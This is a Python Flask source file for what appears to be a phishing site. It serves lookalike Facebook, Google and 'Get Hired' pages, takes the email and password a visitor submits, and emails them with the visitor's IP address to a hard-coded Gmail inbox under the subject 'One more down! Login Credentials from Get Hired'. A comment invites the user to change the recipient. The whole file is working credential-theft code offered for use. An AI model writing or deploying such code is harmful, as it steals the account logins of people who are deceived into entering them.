from flask import Flask, render_template, request
from flask_mail import Mail, Message
import settings

app = Flask(__name__)
app.config.update(
	DEBUG=True,
	#EMAIL SETTINGS
	MAIL_SERVER='smtp.gmail.com',
	MAIL_PORT=465,
	MAIL_USE_SSL=True,
	MAIL_USE_TLS = False,
	MAIL_SUPPRESS_SEND = False,
	MAIL_DEBUG = True,
	TESTING = False,
	MAIL_USERNAME = settings.email,
	MAIL_PASSWORD = settings.password,
	MAIL_DEFAULT_SENDER = settings.email
)

mail = Mail(app)

@app.route("/")
def new():
	return render_template('hackerearth.html')

@app.route("/facebook")
def facebook():
	return render_template("facebook.html")

@app.route("/google")
def google():
	return render_template("google.html")

@app.route("/home", methods=["POST"])
def home():
	if request.method == "POST":
		email = request.values.get("email")
		password = request.values.get("passwordField")
		if "google" in request.form:
			website = "Google"
		else:
			website = "Facebook"
		try:
			msg = Message("One more down! Login Credentials from Get Hired",
		  	recipients=["forbidden@gmail.com"])  #Change it to mail someone else.
			msg.body = "Email:        "+str(email)+"\nPassword: "+str(password)+\
			"\nIP:            "+str(request.remote_addr)+"\nWebsite:    "+website
			mail.send(msg)
		except Exception as e:
			return e

	return render_template('loading.html')

if __name__ == '__main__':
    app.run(debug=True,port=100)
